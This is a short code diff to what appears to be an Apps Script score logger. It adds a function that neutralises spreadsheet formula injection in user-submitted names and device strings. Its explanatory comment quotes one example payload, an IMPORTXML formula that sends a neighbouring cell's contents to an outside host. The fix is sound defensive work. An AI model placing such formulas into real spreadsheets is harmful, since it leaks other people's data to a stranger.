@@ -276,6 +276,17 @@ function bests_(rows) {
  * at a booth the popup opens the moment the game ends and there is no second
  * gap to hide a fetch in.
  */
+/* A spreadsheet cell that starts with = + - or @ is a FORMULA the moment the
+   workbook is opened, not text. These rows carry what a stranger typed into a
+   public form, so a "name" of =IMPORTXML("https://theirs/"&B2,"//a") would run
+   in our workbook, with our access, and hand them the row next to it. A
+   leading apostrophe makes Sheets keep the value as text; it does not show in
+   the cell and it does not change what anybody reads. */
+function cell_(v) {
+  var s = String(v == null ? '' : v);
+  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
+}
+
 function doPost(e) {
   try {
     var body = {};
@@ -308,9 +319,9 @@ function doPost(e) {
         now,
         now.getTime(),
         id,
-        name,
+        cell_(name),
         score,
-        String(body.device || '').slice(0, 40),
+        cell_(String(body.device || '').slice(0, 40)),
         false,
         String((e && e.postData && e.postData.type) || '') +
           ' ' + String(body.ua || '').slice(0, 120)
